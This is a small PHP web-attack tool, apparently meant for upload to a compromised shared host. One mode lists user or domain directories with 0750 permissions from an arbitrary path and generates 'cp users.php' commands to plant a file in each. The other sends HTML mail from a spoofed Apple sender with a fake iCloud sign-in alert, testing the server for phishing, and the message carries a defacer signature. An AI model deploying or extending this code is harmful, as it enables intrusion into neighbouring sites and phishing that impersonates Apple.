<?php 
error_reporting(0);
if (isset($_GET['tool'])) {
	if ($_GET['tool'] == 'dirdom') {
		?>
		<form  action="" method="post">
			<input type="text" name="dir" placeholder="dir" value="<?= getcwd(); ?>">
		</form>
		<?php
		if (isset($_POST)) {

			$dir = $_POST['dir'];
			$list = scandir($dir);
			// echo "<textarea s\>";
			?>
			<textarea style="width: 300px;height: 200px;">
			<?php
			foreach ($list as $files) {
				$dirs = $dir."//".$files;
				if (is_dir($dirs)) {
					if ($files != ".") {
						$perm = substr(sprintf('%o', fileperms($dirs)), -4);
						if ($perm == "0750") {
echo "cp users.php ". $dir."/".$files." | ";
						}
					}
				}
			}
			echo "</textarea>";
			?>
			<textarea style="width: 300px;height: 200px;">
			<?php
			foreach ($list as $files) {
				$dirs = $dir."//".$files;
				if (is_dir($dirs)) {
					if ($files != ".") {
						$perm = substr(sprintf('%o', fileperms($dirs)), -4);
						if ($perm == "0750") {
echo $files."\n";
						}
					}
				}
			}
			echo "</textarea>";
		}
	}
	if ($_GET['tool'] == 'mail') {
		if (isset($_POST)) {
			$name = "Apple"; $to = $_POST['email']; $web="$_SERVER[HTTP_HOST]"; 
			$subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
			$body = ' 
			<a href="https://wikipedia.org/">Tested Mail 1</a> 
			<br> 
			<a href="https://wikipedia.org/">Tested Mail 2</a> Kids Was Here '; 
			$email = "Apple@$web"; 
			$headers = 'From: ' .
			$email . "\r\n". 
			$headers = "Content-type: text/html\r\n"; 'Reply-To: ' . 
			$email. "\r\n" . 'X-Mailer: PHP/' . phpversion(); 
			if (mail($to,$subject,$body,$headers,$name)) { 
				echo("<font color=lime>Email Sended To => $to </font>"); 
			} 
			else { 
				echo("<font color=red>Not Support For Mailer</font>"); 
			} 

		}
		?>	
		<form  action="" method="post">
			<input type="text" name="email" placeholder="Email">
		</form>

		<?php
	}
}

?>


<!DOCTYPE html>
<html>
<head>
	<title>My tool </title>
</head>
<body>
<ul>
	<li><a href="?tool=dirdom&dir=<?= getcwd(); ?>">Domain Directory</a></li>
	<li><a href="?tool=mail">Mail Test</a></li>
</ul>
</body>
</html>